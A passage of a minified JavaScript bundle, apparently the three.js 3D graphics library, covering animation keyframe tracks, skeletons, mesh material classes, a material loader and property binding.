s&&isNaN(s)){t=!1;break}if(null!==a&&a>s){t=!1;break}a=s}if(void 0!==n&&Vr.isTypedArray(n)){o=0;for(var l=n.length;o!==l;++o){var c=n[o];if(isNaN(c)){t=!1;break}}}return t},optimize:function(){for(var t=this.times,e=this.values,i=this.getValueSize(),n=2302===this.getInterpolation(),r=1,a=t.length-1,o=1;o<a;++o){var s=!1,l=t[o];if(l!==t[o+1]&&(1!==o||l!==l[0]))if(n)s=!0;else for(var c=o*i,h=c-i,u=c+i,d=0;d!==i;++d){var p=e[c+d];if(p!==e[h+d]||p!==e[u+d]){s=!0;break}}if(s){if(o!==r){t[r]=t[o];var f=o*i,m=r*i;for(d=0;d!==i;++d)e[m+d]=e[f+d]}++r}}if(a>0){for(t[r]=t[a],f=a*i,m=r*i,d=0;d!==i;++d)e[m+d]=e[f+d];++r}return r!==t.length&&(this.times=Vr.arraySlice(t,0,r),this.values=Vr.arraySlice(e,0,r*i)),this},clone:function(){var t=Vr.arraySlice(this.times,0),e=Vr.arraySlice(this.values,0),i=new(0,this.constructor)(this.name,t,e);return i.createInterpolant=this.createInterpolant,i}}),Zr.prototype=Object.assign(Object.create(qr.prototype),{constructor:Zr,ValueTypeName:"bool",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),Kr.prototype=Object.assign(Object.create(qr.prototype),{constructor:Kr,ValueTypeName:"color"}),Jr.prototype=Object.assign(Object.create(qr.prototype),{constructor:Jr,ValueTypeName:"number"}),Qr.prototype=Object.assign(Object.create(fr.prototype),{constructor:Qr,interpolate_:function(t,e,i,n){for(var r=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=t*o,l=(i-e)/(n-e),c=s+o;s!==c;s+=4)te.slerpFlat(r,0,a,s-o,a,s,l);return r}}),ta.prototype=Object.assign(Object.create(qr.prototype),{constructor:ta,ValueTypeName:"quaternion",DefaultInterpolation:2301,InterpolantFactoryMethodLinear:function(t){return new Qr(this.times,this.values,this.getValueSize(),t)},InterpolantFactoryMethodSmooth:void 0}),ea.prototype=Object.assign(Object.create(qr.prototype),{constructor:ea,ValueTypeName:"string",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),ia.prototype=Object.assign(Object.create(qr.prototype),{constructor:ia,ValueTypeName:"vector"}),Object.assign(na,{parse:function(t){for(var e=[],i=t.tracks,n=1/(t.fps||1),r=0,a=i.length;r!==a;++r)e.push(ra(i[r]).scale(n));return new na(t.name,t.duration,e)},toJSON:function(t){for(var e=[],i=t.tracks,n={name:t.name,duration:t.duration,tracks:e,uuid:t.uuid},r=0,a=i.length;r!==a;++r)e.push(qr.toJSON(i[r]));return n},CreateFromMorphTargetSequence:function(t,e,i,n){for(var r=e.length,a=[],o=0;o<r;o++){var s=[],l=[];s.push((o+r-1)%r,o,(o+1)%r),l.push(0,1,0);var c=Vr.getKeyframeOrder(s);s=Vr.sortedArray(s,1,c),l=Vr.sortedArray(l,1,c),n||0!==s[0]||(s.push(r),l.push(l[0])),a.push(new Jr(".morphTargetInfluences["+e[o].name+"]",s,l).scale(1/i))}return new na(t,-1,a)},findByName:function(t,e){var i=t;if(!Array.isArray(t)){var n=t;i=n.geometry&&n.geometry.animations||n.animations}for(var r=0;r<i.length;r++)if(i[r].name===e)return i[r];return null},CreateClipsFromMorphTargetSequences:function(t,e,i){for(var n={},r=/^([\w-]*?)([\d]+)$/,a=0,o=t.length;a<o;a++){var s=t[a],l=s.name.match(r);if(l&&l.length>1){var c=n[u=l[1]];c||(n[u]=c=[]),c.push(s)}}var h=[];for(var u in n)h.push(na.CreateFromMorphTargetSequence(u,n[u],e,i));return h},parseAnimation:function(t,e){if(!t)return null;for(var i=function(t,e,i,n,r){if(0!==i.length){var a=[],o=[];Vr.flattenJSON(i,a,o,n),0!==a.length&&r.push(new t(e,a,o))}},n=[],r=t.name||"default",a=t.length||-1,o=t.fps||30,s=t.hierarchy||[],l=0;l<s.length;l++){var c=s[l].keys;if(c&&0!==c.length)if(c[0].morphTargets){for(var h={},u=0;u<c.length;u++)if(c[u].morphTargets)for(var d=0;d<c[u].morphTargets.length;d++)h[c[u].morphTargets[d]]=-1;for(var p in h){var f=[],m=[];for(d=0;d!==c[u].morphTargets.length;++d){var _=c[u];f.push(_.time),m.push(_.morphTarget===p?1:0)}n.push(new Jr(".morphTargetInfluence["+p+"]",f,m))}a=h.length*(o||1)}else{var g=".bones["+e[l].name+"]";i(ia,g+".position",c,"pos",n),i(ta,g+".quaternion",c,"rot",n),i(ia,g+".scale",c,"scl",n)}}return 0===n.length?null:new na(r,a,n)}}),Object.assign(na.prototype,{resetDuration:function(){for(var t=0,e=0,i=this.tracks.length;e!==i;++e){var n=this.tracks[e];t=Math.max(t,n.times[n.times.length-1])}return this.duration=t,this},trim:function(){for(var t=0;t<this.tracks.length;t++)this.tracks[t].trim(0,this.duration);return this},validate:function(){for(var t=!0,e=0;e<this.tracks.length;e++)t=t&&this.tracks[e].validate();return t},optimize:function(){for(var t=0;t<this.tracks.length;t++)this.tracks[t].optimize();return this},clone:function(){for(var t=[],e=0;e<this.tracks.length;e++)t.push(this.tracks[e].clone());return new na(this.name,this.duration,t)}}),aa.prototype=Object.assign(Object.create(De.prototype),{constructor:aa,isBone:!0}),Object.assign(oa.prototype,{calculateInverses:function(){this.boneInverses=[];for(var t=0,e=this.bones.length;t<e;t++){var i=new Qt;this.bones[t]&&i.getInverse(this.bones[t].matrixWorld),this.boneInverses.push(i)}},pose:function(){var t,e,i;for(e=0,i=this.bones.length;e<i;e++)(t=this.bones[e])&&t.matrixWorld.getInverse(this.boneInverses[e]);for(e=0,i=this.bones.length;e<i;e++)(t=this.bones[e])&&(t.parent&&t.parent.isBone?(t.matrix.getInverse(t.parent.matrixWorld),t.matrix.multiply(t.matrixWorld)):t.matrix.copy(t.matrixWorld),t.matrix.decompose(t.position,t.quaternion,t.scale))},update:(Gr=new Qt,Ur=new Qt,function(){for(var t=this.bones,e=this.boneInverses,i=this.boneMatrices,n=this.boneTexture,r=0,a=t.length;r<a;r++){var o=t[r]?t[r].matrixWorld:Ur;Gr.multiplyMatrices(o,e[r]),Gr.toArray(i,16*r)}void 0!==n&&(n.needsUpdate=!0)}),clone:function(){return new oa(this.bones,this.boneInverses)},getBoneByName:function(t){for(var e=0,i=this.bones.length;e<i;e++){var n=this.bones[e];if(n.name===t)return n}}}),sa.prototype=Object.create(Rr.prototype),sa.prototype.constructor=sa,sa.prototype.isLineDashedMaterial=!0,sa.prototype.copy=function(t){return Rr.prototype.copy.call(this,t),this.scale=t.scale,this.dashSize=t.dashSize,this.gapSize=t.gapSize,this},la.prototype=Object.create(li.prototype),la.prototype.constructor=la,la.prototype.isMeshDepthMaterial=!0,la.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.depthPacking=t.depthPacking,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.map=t.map,this.alphaMap=t.alphaMap,this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this},ca.prototype=Object.create(li.prototype),ca.prototype.constructor=ca,ca.prototype.isMeshDistanceMaterial=!0,ca.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.referencePosition.copy(t.referencePosition),this.nearDistance=t.nearDistance,this.farDistance=t.farDistance,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.map=t.map,this.alphaMap=t.alphaMap,this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this},ha.prototype=Object.create(li.prototype),ha.prototype.constructor=ha,ha.prototype.isMeshLambertMaterial=!0,ha.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.emissive.copy(t.emissive),this.emissiveMap=t.emissiveMap,this.emissiveIntensity=t.emissiveIntensity,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},ua.prototype=Object.create(li.prototype),ua.prototype.constructor=ua,ua.prototype.isMeshNormalMaterial=!0,ua.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},da.prototype=Object.create(li.prototype),da.prototype.constructor=da,da.prototype.isMeshPhongMaterial=!0,da.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this.specular.copy(t.specular),this.shininess=t.shininess,this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.emissive.copy(t.emissive),this.emissiveMap=t.emissiveMap,this.emissiveIntensity=t.emissiveIntensity,this.bumpMap=t.bumpMap,this.bumpScale=t.bumpScale,this.normalMap=t.normalMap,this.normalMapType=t.normalMapType,this.normalScale.copy(t.normalScale),this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this},pa.prototype=Object.create(Ar.prototype),pa.prototype.constructor=pa,pa.prototype.isMeshPhysicalMaterial=!0,pa.prototype.copy=function(t){return Ar.prototype.copy.call(this,t),this.defines={PHYSICAL:""},this.reflectivity=t.reflectivity,this.clearCoat=t.clearCoat,this.clearCoatRoughness=t.clearCoatRoughness,this},fa.prototype=Object.create(da.prototype),fa.prototype.constructor=fa,fa.prototype.isMeshToonMaterial=!0,fa.prototype.copy=function(t){return da.prototype.copy.call(this,t),this.gradientMap=t.gradientMap,this},ma.prototype=Object.create(bi.prototype),ma.prototype.constructor=ma,ma.prototype.isRawShaderMaterial=!0,_a.prototype=Object.create(li.prototype),_a.prototype.constructor=_a,_a.prototype.isShadowMaterial=!0,_a.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this},ga.prototype=Object.create(li.prototype),ga.prototype.constructor=ga,ga.prototype.isSpriteMaterial=!0,ga.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.rotation=t.rotation,this.sizeAttenuation=t.sizeAttenuation,this},Object.assign(va.prototype,{load:function(t,e,i,n){var r=this,a=new _r(r.manager);a.setPath(r.path),a.load(t,(function(t){e(r.parse(JSON.parse(t)))}),i,n)},parse:function(t){var e=this.textures;function i(t){return e[t],e[t]}var n=new{LineBasicMaterial:Rr,LineDashedMaterial:sa,MeshBasicMaterial:Si,MeshDepthMaterial:la,MeshDistanceMaterial:ca,MeshLambertMaterial:ha,MeshNormalMaterial:ua,MeshPhongMaterial:da,MeshPhysicalMaterial:pa,MeshStandardMaterial:Ar,MeshToonMaterial:fa,PointsMaterial:zr,RawShaderMaterial:ma,ShaderMaterial:bi,ShadowMaterial:_a,SpriteMaterial:ga}[t.type];if(void 0!==t.uuid&&(n.uuid=t.uuid),void 0!==t.name&&(n.name=t.name),void 0!==t.color&&n.color.setHex(t.color),void 0!==t.roughness&&(n.roughness=t.roughness),void 0!==t.metalness&&(n.metalness=t.metalness),void 0!==t.emissive&&n.emissive.setHex(t.emissive),void 0!==t.specular&&n.specular.setHex(t.specular),void 0!==t.shininess&&(n.shininess=t.shininess),void 0!==t.clearCoat&&(n.clearCoat=t.clearCoat),void 0!==t.clearCoatRoughness&&(n.clearCoatRoughness=t.clearCoatRoughness),void 0!==t.vertexColors&&(n.vertexColors=t.vertexColors),void 0!==t.fog&&(n.fog=t.fog),void 0!==t.flatShading&&(n.flatShading=t.flatShading),void 0!==t.blending&&(n.blending=t.blending),void 0!==t.combine&&(n.combine=t.combine),void 0!==t.side&&(n.side=t.side),void 0!==t.opacity&&(n.opacity=t.opacity),void 0!==t.transparent&&(n.transparent=t.transparent),void 0!==t.alphaTest&&(n.alphaTest=t.alphaTest),void 0!==t.depthTest&&(n.depthTest=t.depthTest),void 0!==t.depthWrite&&(n.depthWrite=t.depthWrite),void 0!==t.colorWrite&&(n.colorWrite=t.colorWrite),void 0!==t.wireframe&&(n.wireframe=t.wireframe),void 0!==t.wireframeLinewidth&&(n.wireframeLinewidth=t.wireframeLinewidth),void 0!==t.wireframeLinecap&&(n.wireframeLinecap=t.wireframeLinecap),void 0!==t.wireframeLinejoin&&(n.wireframeLinejoin=t.wireframeLinejoin),void 0!==t.rotation&&(n.rotation=t.rotation),1!==t.linewidth&&(n.linewidth=t.linewidth),void 0!==t.dashSize&&(n.dashSize=t.dashSize),void 0!==t.gapSize&&(n.gapSize=t.gapSize),void 0!==t.scale&&(n.scale=t.scale),void 0!==t.polygonOffset&&(n.polygonOffset=t.polygonOffset),void 0!==t.polygonOffsetFactor&&(n.polygonOffsetFactor=t.polygonOffsetFactor),void 0!==t.polygonOffsetUnits&&(n.polygonOffsetUnits=t.polygonOffsetUnits),void 0!==t.skinning&&(n.skinning=t.skinning),void 0!==t.morphTargets&&(n.morphTargets=t.morphTargets),void 0!==t.dithering&&(n.dithering=t.dithering),void 0!==t.visible&&(n.visible=t.visible),void 0!==t.userData&&(n.userData=t.userData),void 0!==t.uniforms)for(var r in t.uniforms){var a=t.uniforms[r];switch(n.uniforms[r]={},a.type){case"t":n.uniforms[r].value=i(a.value);break;case"c":n.uniforms[r].value=(new be).setHex(a.value);break;case"v2":n.uniforms[r].value=(new Jt).fromArray(a.value);break;case"v3":n.uniforms[r].value=(new ee).fromArray(a.value);break;case"v4":n.uniforms[r].value=(new ke).fromArray(a.value);break;case"m3":n.uniforms[r].value=(new ie).fromArray(a.value);case"m4":n.uniforms[r].value=(new Qt).fromArray(a.value);break;default:n.uniforms[r].value=a.value}}if(void 0!==t.defines&&(n.defines=t.defines),void 0!==t.vertexShader&&(n.vertexShader=t.vertexShader),void 0!==t.fragmentShader&&(n.fragmentShader=t.fragmentShader),void 0!==t.extensions)for(var o in t.extensions)n.extensions[o]=t.extensions[o];if(void 0!==t.shading&&(n.flatShading=1===t.shading),void 0!==t.size&&(n.size=t.size),void 0!==t.sizeAttenuation&&(n.sizeAttenuation=t.sizeAttenuation),void 0!==t.map&&(n.map=i(t.map)),void 0!==t.alphaMap&&(n.alphaMap=i(t.alphaMap),n.transparent=!0),void 0!==t.bumpMap&&(n.bumpMap=i(t.bumpMap)),void 0!==t.bumpScale&&(n.bumpScale=t.bumpScale),void 0!==t.normalMap&&(n.normalMap=i(t.normalMap)),void 0!==t.normalMapType&&(n.normalMapType=t.normalMapType),void 0!==t.normalScale){var s=t.normalScale;!1===Array.isArray(s)&&(s=[s,s]),n.normalScale=(new Jt).fromArray(s)}return void 0!==t.displacementMap&&(n.displacementMap=i(t.displacementMap)),void 0!==t.displacementScale&&(n.displacementScale=t.displacementScale),void 0!==t.displacementBias&&(n.displacementBias=t.displacementBias),void 0!==t.roughnessMap&&(n.roughnessMap=i(t.roughnessMap)),void 0!==t.metalnessMap&&(n.metalnessMap=i(t.metalnessMap)),void 0!==t.emissiveMap&&(n.emissiveMap=i(t.emissiveMap)),void 0!==t.emissiveIntensity&&(n.emissiveIntensity=t.emissiveIntensity),void 0!==t.specularMap&&(n.specularMap=i(t.specularMap)),void 0!==t.envMap&&(n.envMap=i(t.envMap)),void 0!==t.envMapIntensity&&(n.envMapIntensity=t.envMapIntensity),void 0!==t.reflectivity&&(n.reflectivity=t.reflectivity),void 0!==t.lightMap&&(n.lightMap=i(t.lightMap)),void 0!==t.lightMapIntensity&&(n.lightMapIntensity=t.lightMapIntensity),void 0!==t.aoMap&&(n.aoMap=i(t.aoMap)),void 0!==t.aoMapIntensity&&(n.aoMapIntensity=t.aoMapIntensity),void 0!==t.gradientMap&&(n.gradientMap=i(t.gradientMap)),n},setPath:function(t){return this.path=t,this},setTextures:function(t){return this.textures=t,this}}),ya.Handlers={handlers:[],add:function(t,e){this.handlers.push(t,e)},get:function(t){for(var e=this.handlers,i=0,n=e.length;i<n;i+=2){var r=e[i],a=e[i+1];if(r.test(t))return a}return null}},Object.assign(ya.prototype,{crossOrigin:"anonymous",onLoadStart:function(){},onLoadProgress:function(){},onLoadComplete:function(){},initMaterials:function(t,e,i){for(var n=[],r=0;r<t.length;++r)n[r]=this.createMaterial(t[r],e,i);return n},createMaterial:(Br={NoBlending:0,NormalBlending:1,AdditiveBlending:2,SubtractiveBlending:3,MultiplyBlending:4,CustomBlending:5},jr=new be,Wr=new dr,Hr=new va,function(t,e,i){var n={};function r(t,r,a,o,s){var l,c=e+t,h=ya.Handlers.get(c);null!==h?l=h.load(c):(Wr.setCrossOrigin(i),l=Wr.load(c)),void 0!==r&&(l.repeat.fromArray(r),1!==r[0]&&(l.wrapS=Lt),1!==r[1]&&(l.wrapT=Lt)),void 0!==a&&l.offset.fromArray(a),void 0!==o&&("repeat"===o[0]&&(l.wrapS=Lt),"mirror"===o[0]&&(l.wrapS=At),"repeat"===o[1]&&(l.wrapT=Lt),"mirror"===o[1]&&(l.wrapT=At)),void 0!==s&&(l.anisotropy=s);var u=Zt.generateUUID();return n[u]=l,u}var a={uuid:Zt.generateUUID(),type:"MeshLambertMaterial"};for(var o in t){var s=t[o];switch(o){case"DbgColor":case"DbgIndex":case"opticalDensity":case"illumination":break;case"DbgName":a.name=s;break;case"blending":a.blending=Br[s];break;case"colorAmbient":case"mapAmbient":break;case"colorDiffuse":a.color=jr.fromArray(s).getHex();break;case"colorSpecular":a.specular=jr.fromArray(s).getHex();break;case"colorEmissive":a.emissive=jr.fromArray(s).getHex();break;case"specularCoef":a.shininess=s;break;case"shading":"basic"===s.toLowerCase()&&(a.type="MeshBasicMaterial"),"phong"===s.toLowerCase()&&(a.type="MeshPhongMaterial"),"standard"===s.toLowerCase()&&(a.type="MeshStandardMaterial");break;case"mapDiffuse":a.map=r(s,t.mapDiffuseRepeat,t.mapDiffuseOffset,t.mapDiffuseWrap,t.mapDiffuseAnisotropy);break;case"mapDiffuseRepeat":case"mapDiffuseOffset":case"mapDiffuseWrap":case"mapDiffuseAnisotropy":break;case"mapEmissive":a.emissiveMap=r(s,t.mapEmissiveRepeat,t.mapEmissiveOffset,t.mapEmissiveWrap,t.mapEmissiveAnisotropy);break;case"mapEmissiveRepeat":case"mapEmissiveOffset":case"mapEmissiveWrap":case"mapEmissiveAnisotropy":break;case"mapLight":a.lightMap=r(s,t.mapLightRepeat,t.mapLightOffset,t.mapLightWrap,t.mapLightAnisotropy);break;case"mapLightRepeat":case"mapLightOffset":case"mapLightWrap":case"mapLightAnisotropy":break;case"mapAO":a.aoMap=r(s,t.mapAORepeat,t.mapAOOffset,t.mapAOWrap,t.mapAOAnisotropy);break;case"mapAORepeat":case"mapAOOffset":case"mapAOWrap":case"mapAOAnisotropy":break;case"mapBump":a.bumpMap=r(s,t.mapBumpRepeat,t.mapBumpOffset,t.mapBumpWrap,t.mapBumpAnisotropy);break;case"mapBumpScale":a.bumpScale=s;break;case"mapBumpRepeat":case"mapBumpOffset":case"mapBumpWrap":case"mapBumpAnisotropy":break;case"mapNormal":a.normalMap=r(s,t.mapNormalRepeat,t.mapNormalOffset,t.mapNormalWrap,t.mapNormalAnisotropy);break;case"mapNormalFactor":a.normalScale=s;break;case"mapNormalRepeat":case"mapNormalOffset":case"mapNormalWrap":case"mapNormalAnisotropy":break;case"mapSpecular":a.specularMap=r(s,t.mapSpecularRepeat,t.mapSpecularOffset,t.mapSpecularWrap,t.mapSpecularAnisotropy);break;case"mapSpecularRepeat":case"mapSpecularOffset":case"mapSpecularWrap":case"mapSpecularAnisotropy":break;case"mapMetalness":a.metalnessMap=r(s,t.mapMetalnessRepeat,t.mapMetalnessOffset,t.mapMetalnessWrap,t.mapMetalnessAnisotropy);break;case"mapMetalnessRepeat":case"mapMetalnessOffset":case"mapMetalnessWrap":case"mapMetalnessAnisotropy":break;case"mapRoughness":a.roughnessMap=r(s,t.mapRoughnessRepeat,t.mapRoughnessOffset,t.mapRoughnessWrap,t.mapRoughnessAnisotropy);break;case"mapRoughnessRepeat":case"mapRoughnessOffset":case"mapRoughnessWrap":case"mapRoughnessAnisotropy":break;case"mapAlpha":a.alphaMap=r(s,t.mapAlphaRepeat,t.mapAlphaOffset,t.mapAlphaWrap,t.mapAlphaAnisotropy);break;case"mapAlphaRepeat":case"mapAlphaOffset":case"mapAlphaWrap":case"mapAlphaAnisotropy":break;case"flipSided":a.side=1;break;case"doubleSided":a.side=2;break;case"transparency":a.opacity=s;break;case"depthTest":case"depthWrite":case"colorWrite":case"opacity":case"reflectivity":case"transparent":case"visible":case"wireframe":a[o]=s;break;case"vertexColors":!0===s&&(a.vertexColors=2),"face"===s&&(a.vertexColors=1)}}return"MeshBasicMaterial"===a.type&&delete a.emissive,"MeshPhongMaterial"!==a.type&&delete a.specular,a.opacity<1&&(a.transparent=!0),Hr.setTextures(n),Hr.parse(a)})});var xa,ba,wa,Ta,Sa,Ma,Ea,La,ka,Aa=function(t){if("undefined"!=typeof TextDecoder)return(new TextDecoder).decode(t);for(var e="",i=0,n=t.length;i<n;i++)e+=String.fromCharCode(t[i]);return decodeURIComponent(escape(e))},Pa=function(t){var e=t.lastIndexOf("/");return-1===e?"./":t.substr(0,e+1)};function Oa(t,e,i){var n=i||Ca.parseTrackName(e);this._targetGroup=t,this._bindings=t.subscribe_(e,n)}function Ca(t,e,i){this.path=e,this.parsedPath=i||Ca.parseTrackName(e),this.node=Ca.findNode(t,this.parsedPath.nodeName)||t,this.rootNode=t}i(72),Object.assign(Oa.prototype,{getValue:function(t,e){this.bind();var i=this._targetGroup.nCachedObjects_,n=this._bindings[i];void 0!==n&&n.getValue(t,e)},setValue:function(t,e){for(var i=this._bindings,n=this._targetGroup.nCachedObjects_,r=i.length;n!==r;++n)i[n].setValue(t,e)},bind:function(){for(var t=this._bindings,e=this._targetGroup.nCachedObjects_,i=t.length;e!==i;++e)t[e].bind()},unbind:function(){for(var t=this._bindings,e=this._targetGroup.nCachedObjects_,i=t.length;e!==i;++e)t[e].unbind()}}),Object.assign(Ca,{Composite:Oa,create:function(t,e,i){return t&&t.isAnimationObjectGroup?new Ca.Composite(t,e,i):new Ca(t,e,i)},sanitizeNodeName:(ka=new RegExp("[\\[\\]\\.:\\/]","g"),function(t){return t.replace(/\s/g,"_").replace(ka,"")}),parseTrackName:(xa="[^\\[\\]\\.:\\/]",ba="[^"+"\\[\\]\\.:\\/".replace("\\.","")+"]",wa=/((?:WC+[\/:])*)/.source.replace("WC",xa),Ta=/(WCOD+)?/.source.replace("WCOD",ba),Sa=/(?:\.(WC+)(?:\[(.+)\])?)?/.source.replace("WC",xa),Ma=/\.(WC+)(?:\[(.+)\])?/.source.replace("WC",xa),Ea=new RegExp("^"+wa+Ta+Sa+Ma+"$"),La=["material","materials","bones"],function(t){var e=Ea.exec(t);if(!e)throw new Error("PropertyBinding: Cannot parse trackName: "+t);var i={nodeName:e[2],objectName:e[3],objectIndex:e[4],propertyName:e[5],propertyIndex:e[6]},n=i.nodeName&&i.nodeName.lastIndexOf(".");if(void 0!==n&&-1!==n){var r=i.nodeName.substring(n+1);-1!==La.indexOf(r)&&(i.nodeName=i.nodeName.substring(0,n),i.objectName=r)}if(null===i.propertyName||0===i.propertyName.length)throw new Error("PropertyBinding: can not parse propertyName from trackName: "+t);return i}),findNode:function(t,e){if(!e||""===e||"root"===e||"."===e||-1===e||e===t.name||e===t.uuid)return t;if(t.skeleton){var i=t.skeleton.getBoneByName(e);if(void 0!==i)return i}if(t.children){var n=function t(i){for(var n=0;n<i.length;n++){var r=i[n];if(r.name===e||r.uuid===e)return r;var a=t(r.children);if(a)return a}return null}(t.children);if(n)return n}return null}}),Object.assign(Ca.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(t,e){t[e]=this.node[this.propertyName]},function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)t[e++]=i[n]},function(t,e){t[e]=this.resolvedProperty[this.propertyIndex]},function(t,e){this.resolvedProperty.toArray(t,e)}],SetterByBindingTypeAndVersioning:[[function(t,e){this.targetObject[this.propertyName]=t[e]},function(t,e){this.targetObject[this.propertyName]=t[e],this.targetObject.needsUpdate=!0},function(t,e){this.targetObject[this.propertyName]=t[e],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=t[e++]},function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=t[e++];this.targetObject.needsUpdate=!0},function(t,e){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=t[e++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(t,e){this.resolvedProperty[this.propertyIndex]=t[e]},function(t,e){this.resolvedProperty[this.propertyIndex]=t[e],this.targetObject.needsUpdate=!0},function(t,e){this.resolvedProperty[this.propertyIndex]=t[e],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(t,e){this.resolvedProperty.fromArray(t,e)},function(t,e){this.resolvedProperty.fromArray(t,e),this.targetObject.needsUpdate=!0},function(t,e){this.resolvedProperty.fromArray(t,e),this.targetObject.matrixWorldNeedsUpdate=!0}]],getValue:function(t,e){this.bind(),this.getValue(t,e)},setValue:function(t,e){this.bind(),this.setValue(t,e)},bind:function(){var t=this.node,e=this.parsedPath,i=e.objectName,n=e.propertyName,r=e.propertyIndex;if(t||(t=Ca.findNode(this.rootNode,e.nodeName)||this.rootNode,this.node=t),this.getValue=this._getValue_unavailable,this.setValue=this._setValue_unavailable,t){if(i){var a=e.objectIndex;switch(i){case"materials":if(!t.material)return;if(!t.material.materials)return;t=t.material.materials;break;case"bones":if(!t.skeleton)return;t=t.skeleton.bones;for(var o=0;o<t.length;o++)if(t[o].name===a){a=o;break}break;default:if(void 0===t[i])return;t=t[i]}if(void 0!==a){if(void 0===t[a])return;t=t[a]}}var s=t[n];if(void 0!==s){var l=this.Versioning.None;this.targetObject=t,void 0!==t.needsUpdate?l=this.Versioning.NeedsUpdate:void 0!==t.matrixWorldNeedsUpdate&&(l=this.Versioning.MatrixWorldNeedsUpdate);var c=this.BindingType.Direct;if(void 0!==r){if("morphTargetInfluences"===n){if(!t.geometry)return;if(t.geometry.isBufferGeometry){if(!t.geometry.morphAttributes)return;for(o=0;o<this.node.geometry.morphAttributes.position.length;o++)if(t.geometry.morphAttributes.position[o].name===r){r=o;break}}else{if(!t.geometry.morphTargets)return;for(o=0;o<this.node.geometry.morphTargets.length;o++)if(t.geometry.morphTargets[o].name===r){r=o;break}}}c=this.BindingType.ArrayElement,this.resolvedProperty=s,this.propertyIndex=r}else void 0!==s.fromArray&&void 0!==s.toArray?(c=this.BindingType.HasFromToArray,this.resolvedProperty=s):Array.isArray(s)?(c=this.BindingType.EntireArray,this.resolvedProperty=s):this.propertyName=n;this.getValue=this.GetterByBindingType[c],this.setValue=this.SetterByBindingTypeAndVersioning[c][l]}else e.nodeName}},unbind:function(){this.node=null,this.getValue=this._getValue_unbound,this.setValue=this._setValue_unbound}}),Object.assign(Ca.prototype,{_getValue_unbound:Ca.prototype.getValue,_setValue_unbound:Ca.prototype.setValue}),i(236),i(237),i(238);var Ra,Ia,Fa,Na,za={computeTangents:function(t){var e=t.index,i=t.attributes;if(null!==e&&void 0!==i.position&&void 0!==i.normal&&void 0!==i.uv){var n=e.array,r=i.position.array,a=i.normal.array,o=i.uv.array,s=r.length/3;void 0===i.tangent&&t.addAttribute("tangent",new We(new Float32Array(4*s),4));for(var l=i.tangent.array,c=[],h=[],u=0;u<s;u++)c[u]=new ee,h[u]=new ee;var d=new ee,p=new ee,f=new ee,m=new Jt,_=new Jt,g=new Jt,v=new ee,y=new ee,x=t.groups;0===x.length&&(x=[{start:0,count:n.length}]),u=0;for(var b=x.length;u<b;++u)for(var w=C=(O=x[u]).start,T=C+O.count;w<T;w+=3)R(n[w+0],n[w+1],n[w+2]);var S,M,E,L=new ee,k=new ee,A=new ee,P=new ee;for(u=0,b=x.length;u<b;++u){var O,C;for(w=C=(O=x[u]).start,T=C+O.count;w<T;w+=3)I(n[w+0]),I(n[w+1]),I(n[w+2])}}function R(t,e,i){d.fromArray(r,3*t),p.fromArray(r,3*e),f.fromArray(r,3*i),m.fromArray(o,2*t),_.fromArray(o,2*e),g.fromArray(o,2*i);var 